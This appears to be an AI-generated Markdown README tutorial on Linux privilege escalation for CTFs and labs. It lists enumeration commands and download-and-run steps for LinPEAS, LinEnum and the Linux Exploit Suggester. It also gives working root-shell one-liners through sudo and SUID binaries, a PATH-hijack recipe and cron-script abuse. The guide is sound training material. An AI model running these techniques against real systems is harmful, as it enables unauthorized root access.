# 🛡️ Linux Privilege Escalation
---

## 📚 What is Privilege Escalation?

- On Linux, users have different permissions (regular user vs. admin called **root**).
- Privilege Escalation: **Getting higher permission than you started with.**
- Main types:
    - **Vertical:** Become root/admin.
    - **Horizontal:** Get another user’s power at same level.

---

## 🧰 Why Practice Privilege Escalation?

- Essential for real penetration testing and CTFs.
- Helps you learn Linux internals and spot misconfigurations.
- Practiced legally in CTFs and virtual labs _never on real, unauthorized systems_.

---

## 🏁 How to Practice Safely

1. **Practice Labs (free and online):**
    - [TryHackMe Linux PrivEsc Room](https://tryhackme.com/room/linprivesc)
    - [HackTheBox Linux PrivEsc Academy](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
    - VMs from [VulnHub](https://www.vulnhub.com/)
2. **Your Own Lab Setup:**
    - Use [VirtualBox](https://www.virtualbox.org/) or [VMware](https://www.vmware.com/) on your PC.
3. **Never attack systems you do not own!**

---

## 🗺️ Index

- [Enumeration Steps](#enumeration-steps)
- [Automated Enum Tools](#automated-enum-tools)
- [Common Exploitation Paths](#common-exploitation-paths)
- [Practice Checklist](#practice-checklist)
- [Quick Reference Table](#quick-reference-table)
- [Essential Resources](#essential-resources)
- [Markdown Cheatsheet](#markdown-cheatsheet)

---

## 🕵️ Enumeration Steps

1. **Who am I? What’s on the box?**

```
id
whoami
hostname
uname -a
cat /etc/issue
```

2. **What’s running? What can I access?**

```
ps -ef
ifconfig      # or: ip a
cat /etc/passwd
sudo -l
find / -perm -u=s -type f 2>/dev/null    # SUID files
```

_**Tip:** Look for old software, unusual processes, world-writable files, and “sudo” commands._  

---

## 🚀 Automated Enum Tools

_These scripts quickly scan and highlight potential escalation paths._

- **LinPEAS:**  
    - Download:  
      ```
      wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
      chmod +x linpeas.sh
      ./linpeas.sh
      ```
- **LinEnum:**  
    - Download:  
      ```
      wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
      chmod +x LinEnum.sh
      ./LinEnum.sh
      ```
- **LES (Linux Exploit Suggester):**  
    - Download:
      ```
      wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
      perl linux-exploit-suggester.sh
      ```

---

## 💡 Common Exploitation Paths

### Sudo Rights

If `sudo -l` lists anything, check if you can run programs as root.

```
sudo -l
```

**Try these (examples, replace with output from above):**
```
sudo find . -exec /bin/sh \; -quit
sudo vim -c '!sh'
sudo python3 -c 'import os;os.system("/bin/sh")'
```
- More tricks: [GTFOBins Sudo](https://gtfobins.github.io/)

---

### SUID Binaries

Find programs that always run as their owner (often root).

```
find / -perm -u=s -type f 2>/dev/null
```
- If `/usr/bin/vim` is SUID:  
  ```
  /usr/bin/vim -c '!sh'
  ```
- More SUID tricks: [GTFOBins SUID](https://gtfobins.github.io/)

---

### Writable PATH Folders

If you can edit a folder in `$PATH`, plant your own malicious script.

```
echo $PATH
find / -writable 2>/dev/null
```
```
echo "/bin/sh" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```  
_Run the script or command that uses `ls`—it'll run your version!_

---

### Kernel Exploits

Check your kernel version. Old version? It might be vulnerable.

```
uname -a
```
- Run Linux Exploit Suggester above, or search Exploit-DB for public exploits.

---

### Cron Jobs

```
cat /etc/crontab
ls -la /etc/cron.*
ls -la /var/spool/cron/
```
- If root runs a user-editable script, add your shell command to it.

---

## 🏆 Practice Checklist

- [ ] Get a shell as any user in a test VM/lab
- [ ] Run all enumeration steps
- [ ] Run LinPEAS or LinEnum
- [ ] Check Sudo, SUID, PATH, Kernel, and Cron
- [ ] Look up outputs on [GTFOBins](https://gtfobins.github.io/) or [Exploit-DB](https://www.exploit-db.com/)
- [ ] Practice using guides, walk-throughs, and video lessons

---

## 📝 Quick Reference Table

| PrivEsc Vector      | What to Check              | Exploit Example                        |
|---------------------|---------------------------|----------------------------------------|
| Sudo                | `sudo -l`                 | `sudo python`, `sudo find`, etc.       |
| SUID binaries       | `find ... -perm -u=s ...` | Custom scripts from GTFOBins           |
| PATH abuse          | `$PATH`, writable dirs     | Place malicious script, change $PATH   |
| Kernel exploits     | `uname -a`                | Public exploits (use in labs only!)    |
| Cron jobs           | /etc/crontab, cron.d      | Edit scripts run by root (if possible) |

---

## 🌐 Essential Resources

- [TryHackMe Linux PrivEsc](https://tryhackme.com/room/linprivesc)
- [GTFOBins](https://gtfobins.github.io/)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng)
- [Beginner YouTube Video](https://www.youtube.com/watch?v=ZTnwg3qCdVM)

---

## 📒 Markdown Cheatsheet

- Headings: `# H1`, `## H2`, `### H3`
- Bold: `**bold**`
- Italics: `*italics*`
- Blockquote: `> quote`
- Inline code: `` `code` ``
- Code block:
    ```
    command
    ```
- Table:

    | A | B | C |
    |---|---|---|
    | 1 | 2 | 3 |

- Link: `[title](https://example.com)`
- Task list:  
    - [ ] Unchecked  
    - [x] Checked

---

*Good luck and have fun learning!*

```
***

This file is ready to copy-paste directly into a GitHub README.md or any Markdown editor.[6][9][2]

[1](https://about.samarth.ac.in/docs/guides/markdown-syntax-guide)
[2](https://www.markdownguide.org/cheat-sheet/)
[3](https://confluence.atlassian.com/display/BITBUCKETSERVER081/Markdown+syntax+guide)
[4](https://learn.microsoft.com/en-us/azure/devops/project/wiki/markdown-guidance?view=azure-devops)
[5](https://www.jetbrains.com/help/hub/markdown-syntax.html)
[6](https://www.markdownguide.org/basic-syntax/)
[7](https://google.github.io/styleguide/docguide/style.html)
[8](https://www.markdownguide.org)
[9](https://docs.github.com/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax)
